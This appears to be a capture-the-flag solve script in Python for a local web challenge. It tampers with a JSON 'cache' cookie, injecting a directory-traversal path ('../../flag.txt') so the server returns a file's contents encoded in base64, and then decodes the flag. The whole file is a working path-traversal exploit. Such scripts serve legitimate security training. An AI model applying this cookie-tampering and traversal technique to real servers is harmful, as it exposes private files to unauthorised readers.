import requests
import urllib.parse
import os
import json
import re
import base64

HOST = os.getenv("HOST", "localhost")
PORT = os.getenv("PORT", "8003")
URL = f"http://{HOST}:{PORT}/"

r = requests.get(URL, allow_redirects=False)
cache = json.loads(urllib.parse.unquote(r.cookies['cache']))
sess = r.cookies['PHPSESSID']

cache['expiry'] = 123
cache['data'][0]['name'] = "../../../../../../../../flag.txt"
for i in range(len(cache['data'])-1, 0, -1):
    del cache['data'][i]

cache_json = urllib.parse.quote(json.dumps(cache))
r = requests.get(URL, cookies={'PHPSESSID': sess, 'cache': cache_json})

flag = base64.b64decode(re.findall("\"data:jpg;base64,(.+)\" alt", r.text)[0])
print(flag)
